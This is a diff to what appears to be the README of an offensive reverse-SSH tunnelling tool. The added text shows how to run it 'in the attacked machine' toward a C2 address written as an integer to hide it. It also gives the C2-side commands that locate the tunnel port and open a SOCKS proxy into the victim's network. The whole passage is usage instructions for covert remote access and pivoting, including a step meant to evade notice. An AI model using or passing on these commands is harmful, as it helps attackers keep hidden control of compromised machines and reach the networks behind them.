@@ -74,7 +74,15 @@ It's very easy. In the attacked machine:
 Cid-SSH.exe 192.168.15.135
 ```
 
+You could also specify the IP address as an integer so it's not very obvious:
+```
+Cid-SSH.exe -t 3232239495
+```
+Page to do the conversion: http://www.aboutmyip.com/AboutMyXApp/IP2Integer.jsp
+
 In the C2:
 ```
-echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p 2222 -oStrictHostKeyChecking=no -D 0.0.0.0:8888
+sudo netstat -ptan | grep sshd | grep LISTEN | grep anon
+# Get the port number, replace the XXXXX 
+echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p XXXXX -oStrictHostKeyChecking=no -D 0.0.0.0:8888
 ```
